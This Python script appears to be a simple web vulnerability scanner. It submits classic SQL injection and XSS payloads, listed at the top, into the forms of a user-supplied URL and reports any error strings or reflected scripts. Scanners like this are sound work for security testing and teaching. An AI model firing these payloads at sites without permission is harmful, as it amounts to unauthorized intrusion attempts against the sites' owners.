import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQL & XSS payloads
SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]

# Common SQL error messages
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    details["action"] = form.attrs.get("action")
    details["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        inputs.append({"name": name, "type": input_type})
    details["inputs"] = inputs
    return details

def is_sql_vulnerable(response):
    for error in SQL_ERRORS:
        if error in response.text.lower():
            return True
    return False

def scan_sql_injection(url):
    print("\n[+] Scanning for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            data = {}
            for input in details["inputs"]:
                if input["type"] == "text" or input["type"] == "search":
                    data[input["name"]] = payload
            target_url = urljoin(url, details["action"])
            if details["method"] == "post":
                response = requests.post(target_url, data=data)
            else:
                response = requests.get(target_url, params=data)

            if is_sql_vulnerable(response):
                print("[!!!] SQL Injection Vulnerability Detected!")
                print("Form Action:", target_url)
                print("Payload:", payload)
                return
    print("[-] No SQL Injection vulnerability found.")

def scan_xss(url):
    print("\n[+] Scanning for XSS...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            data = {}
            for input in details["inputs"]:
                if input["type"] == "text" or input["type"] == "search":
                    data[input["name"]] = payload
            target_url = urljoin(url, details["action"])
            if details["method"] == "post":
                response = requests.post(target_url, data=data)
            else:
                response = requests.get(target_url, params=data)

            if payload in response.text:
                print("[!!!] XSS Vulnerability Detected!")
                print("Form Action:", target_url)
                print("Payload:", payload)
                return
    print("[-] No XSS vulnerability found.")

def main():
    print("=== Web Application Vulnerability Scanner ===")
    target_url = input("Enter Target URL (http://example.com): ")
    scan_sql_injection(target_url)
    scan_xss(target_url)

if __name__ == "__main__":
    main()
